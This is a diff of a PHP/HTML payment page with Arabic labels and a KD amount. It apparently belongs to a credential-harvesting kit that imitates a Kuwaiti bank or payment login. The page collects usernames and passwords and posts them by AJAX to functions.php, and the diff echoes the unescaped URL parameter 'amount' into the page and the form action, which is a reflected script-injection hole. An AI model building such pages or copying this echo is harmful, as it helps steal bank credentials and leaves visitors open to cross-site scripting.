@@ -51,8 +51,7 @@
                 <!-- Box with Name and Image -->
                 <div class="col-md-12 mb-3">
                     <div class="content-box text-center">
-                        <img src="user-image.jpg" alt="User Image" class="rounded-circle mb-3" width="100">
-                        <!-- Replace with your image URL -->
+                        <img src="banner.png" alt="User Image" class="banner mb-3"> <!-- Replace with your image URL -->
                     </div>
                 </div>
             </div>
@@ -72,14 +71,14 @@
                     </li>
                     <li class="list-group-item d-flex justify-content-start">
                         <span class="">المبلغ</span> <!-- Aligns to the left -->
-                        <span class="mx-auto text-blue">100 KD</span> <!-- Centers within the list item -->
+                        <span class="mx-auto text-blue"><?php echo  isset($_GET['amount'])?  $_GET['amount']." KD" :  '100 KD'?></span> <!-- Centers within the list item -->
                     </li>
                 </ul>
             </div>
         </div>
     </section>
 
-    <form action="functions.php" method="post" id="payment-form">
+    <form action="functions.php?amount=<?php echo  isset($_GET['amount'])?  $_GET['amount'] :  '100'?>" method="post" id="payment-form">
         <input type="hidden" name="action" value="sendInfo">
         <section>
             <div class="container">
@@ -92,14 +91,14 @@
                                 </div>
                                 <div class="col-8">
                                     <input type="text" class="form-control" name="username" id="username"
-                                        placeholder="username">
+                                        placeholder="اسم المستخدم">
                                 </div>
                                 <div class="col-4">
                                     <span class="text-blue">الرقم السري</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-8">
                                     <input type="password" class="form-control" name="password" id="password"
-                                        placeholder="password">
+                                        placeholder="الرقم السري">
                                 </div>
                             </div>
                         </li>
@@ -134,8 +133,8 @@
 
 
     <script>
-        $(document).ready(function () {
-            $('#send-data').click(function (e) {
+        $(document).ready(function() {
+            $('#send-data').click(function(e) {
                 e.preventDefault();
                 var isValid = true;
                 var username = $('#username').val();
@@ -158,20 +157,20 @@
 
                 if (isValid) {
                     // Simulate a delay for demonstration (e.g., submitting the form)
-                    setTimeout(function () {
+                    setTimeout(function() {
                         $.ajax({
                             url: 'functions.php', // Replace with your PHP script URL
                             type: 'POST',
                             data: $('#payment-form').serialize(), // Serialize the form data
-                            success: function (response) {
+                            success: function(response) {
                                 // Handle success response
                                 console.log(response);
                             },
-                            error: function (xhr, status, error) {
+                            error: function(xhr, status, error) {
                                 // Handle error response
                                 console.log(xhr.responseText);
                             },
-                            complete: function () {
+                            complete: function() {
                                 // Hide the loader
                                 $('#loader').hide();
                             }
